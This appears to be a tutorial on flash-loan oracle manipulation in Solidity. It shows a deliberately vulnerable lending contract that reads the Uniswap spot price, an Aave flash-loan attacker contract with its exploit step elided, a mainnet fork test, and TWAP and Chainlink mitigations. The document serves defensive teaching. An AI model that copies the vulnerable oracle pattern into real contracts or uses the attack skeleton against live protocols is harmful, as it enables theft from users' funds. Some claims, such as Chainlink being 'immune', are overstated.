# Flash Loan Attack Testing

Foundry fork tests demonstrating flash-loan-based price oracle manipulation and its mitigations.

## Attack Pattern: Price Oracle Manipulation

A flash loan lets an attacker borrow unlimited tokens in a single transaction, manipulate a DEX spot price, exploit a protocol that reads that price, then repay the loan -- all atomically.

## Vulnerable Lending Protocol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

contract VulnerableLending {
    IUniswapV3Pool public pool;
    IERC20 public collateralToken;
    IERC20 public debtToken;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;

    // VULNERABLE: reads instantaneous spot price from Uniswap slot0
    function getPrice() public view returns (uint256) {
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        return uint256(sqrtPriceX96) * uint256(sqrtPriceX96) / (1 << 192);
    }

    function borrow(uint256 collateralAmount, uint256 borrowAmount) external {
        collateralToken.transferFrom(msg.sender, address(this), collateralAmount);
        collateral[msg.sender] += collateralAmount;

        uint256 price = getPrice();
        uint256 collateralValue = collateral[msg.sender] * price / 1e18;
        // 75% LTV
        require(borrowAmount <= collateralValue * 75 / 100, "Undercollateralized");

        debt[msg.sender] += borrowAmount;
        debtToken.transfer(msg.sender, borrowAmount);
    }
}
```

## Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";

interface IAaveFlashLoan {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract FlashLoanAttacker is IFlashLoanReceiver, IUniswapV3SwapCallback {
    IAaveFlashLoan public aavePool;
    IUniswapV3Pool public uniPool;
    address public vulnerableLending;
    IERC20 public token;

    constructor(address _aave, address _uniPool, address _lending, address _token) {
        aavePool = IAaveFlashLoan(_aave);
        uniPool = IUniswapV3Pool(_uniPool);
        vulnerableLending = _lending;
        token = IERC20(_token);
    }

    function attack(uint256 flashAmount) external {
        // Step 1: borrow large amount via Aave flash loan
        aavePool.flashLoanSimple(address(this), address(token), flashAmount, "", 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata
    ) external returns (bool) {
        // Step 2: dump tokens into Uniswap to manipulate spot price
        token.approve(address(uniPool), amount);
        uniPool.swap(address(this), true, int256(amount), 0, "");

        // Step 3: borrow from vulnerable protocol at manipulated price
        // ... exploit the mispriced collateral

        // Step 4: reverse the swap to recover tokens
        uniPool.swap(address(this), false, int256(amount), 0, "");

        // Step 5: repay flash loan + premium
        IERC20(asset).approve(msg.sender, amount + premium);
        return true;
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        if (amount0Delta > 0) token.transfer(msg.sender, uint256(amount0Delta));
    }
}
```

## Fork Test Setup

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

contract FlashLoanAttackTest is Test {
    // Mainnet addresses
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    // USDC/WETH 0.3% pool
    address constant UNI_POOL = 0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8;

    function setUp() public {
        // Fork mainnet at a specific block for reproducibility
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 19_000_000);
    }

    function test_flashLoanManipulatesSpotPrice() public {
        // Read price before manipulation
        (uint160 sqrtPriceBefore,,,,,,) = IUniswapV3Pool(UNI_POOL).slot0();

        // Simulate large swap that moves the price
        address whale = makeAddr("whale");
        deal(USDC, whale, 100_000_000e6); // 100M USDC

        vm.startPrank(whale);
        IERC20(USDC).approve(address(UNI_POOL), type(uint256).max);
        // ... execute swap

        (uint160 sqrtPriceAfter,,,,,,) = IUniswapV3Pool(UNI_POOL).slot0();

        // Price moved significantly within one transaction
        assertFalse(sqrtPriceBefore == sqrtPriceAfter);
        vm.stopPrank();
    }
}
```

Run with fork:

```bash
forge test --match-contract FlashLoanAttackTest --fork-url $ETH_RPC_URL -vvv
```

## Mitigation 1: TWAP Oracle

Use Uniswap V3's time-weighted average price instead of instantaneous spot price.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {OracleLibrary} from "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";

contract TWAPOracle {
    IUniswapV3Pool public pool;
    // 30-minute window resists single-block manipulation
    uint32 public constant TWAP_PERIOD = 1800;

    constructor(address _pool) {
        pool = IUniswapV3Pool(_pool);
    }

    function getPrice() external view returns (uint256) {
        (int24 arithmeticMeanTick, ) = OracleLibrary.consult(
            address(pool),
            TWAP_PERIOD
        );
        return OracleLibrary.getQuoteAtTick(
            arithmeticMeanTick,
            1e18,
            pool.token0(),
            pool.token1()
        );
    }
}
```

## Mitigation 2: Chainlink Feed

Off-chain oracle that cannot be manipulated in a single transaction.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {AggregatorV3Interface} from "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract ChainlinkPriceFeed {
    AggregatorV3Interface public feed;
    uint256 public constant MAX_STALENESS = 3600; // 1 hour

    constructor(address _feed) {
        feed = AggregatorV3Interface(_feed);
    }

    function getPrice() external view returns (uint256) {
        (
            uint80 roundId,
            int256 answer,
            ,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = feed.latestRoundData();
        require(answer > 0, "Negative price");
        require(updatedAt > block.timestamp - MAX_STALENESS, "Stale price");
        require(answeredInRound >= roundId, "Stale round");
        return uint256(answer);
    }
}
```

## Testing That Mitigation Works

```solidity
function test_twapResistsFlashLoan() public {
    // Record TWAP before manipulation
    uint256 twapBefore = twapOracle.getPrice();

    // Execute the same large swap that moved spot price
    _executeManipulationSwap();

    // TWAP barely moves because it averages over 30 minutes
    uint256 twapAfter = twapOracle.getPrice();
    uint256 deviation = twapBefore > twapAfter
        ? (twapBefore - twapAfter) * 10_000 / twapBefore
        : (twapAfter - twapBefore) * 10_000 / twapBefore;

    // Less than 1% deviation despite massive spot price move
    assertLt(deviation, 100);
}
```

## Key Takeaways

- Never use `slot0()` or reserve ratios as a price oracle
- TWAP with a 30+ minute window resists single-transaction manipulation
- Chainlink feeds are off-chain and immune to flash loan manipulation
- Always test with fork testing against real mainnet state
- The cost to manipulate a TWAP scales linearly with the time window -- 30 minutes makes it economically infeasible for most pools
